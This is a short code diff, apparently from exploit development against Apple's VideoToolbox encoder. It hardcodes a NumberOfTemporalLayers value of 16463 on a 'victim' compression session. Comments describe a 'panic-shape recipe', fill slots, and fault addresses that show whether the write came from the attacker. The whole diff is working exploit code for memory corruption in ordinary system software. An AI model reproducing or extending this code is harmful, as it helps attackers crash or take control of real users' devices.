@@ -307,10 +307,10 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         // Panic-shape recipe: raw EncoderUsage=1 + NTL=16463 (no frac pair).
         VTSessionSetProperty(victim, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
         VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
-        OSStatus nSt = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
+        OSStatus nSt = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@16463);
         OSStatus vPrep = VTCompressionSessionPrepareToEncodeFrames(victim);
-        [report appendFormat:@"pcontrol v2 victim=%p ntl=%d nSet=%d prep=%d (fill set slot[0]=0x1)\n",
-         (void *)victim, ntl, (int)nSt, (int)vPrep];
+        [report appendFormat:@"pcontrol v2 victim=%p ntl=16463(fixed) nSet=%d prep=%d (fill sets slot[0]=0x1 ONLY at 16463)\n",
+         (void *)victim, (int)nSt, (int)vPrep];
         CVPixelBufferRef pb = [self makeBufferWidth:W height:H];
         if (pb) {
             VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
@@ -321,7 +321,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         OSStatus setOuter = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rps10);
         [report appendFormat:@"pcontrol set inner(41920)=%d outer(arr10)=%d — teardown: far=0x259 means OUR write, far=0x59 means fill\n",
          (int)setInner, (int)setOuter];
-        [self journal:[NSString stringWithFormat:@"PCONTROL_V2 inner=%d outer=%d — tearing down NTL=%d", (int)setInner, (int)setOuter, ntl]];
+        [self journal:[NSString stringWithFormat:@"PCONTROL_V2 inner=%d outer=%d — tearing down NTL=16463", (int)setInner, (int)setOuter]];
         VTCompressionSessionInvalidate(victim);
         CFRelease(victim);
         CFRelease(retainedVSink);
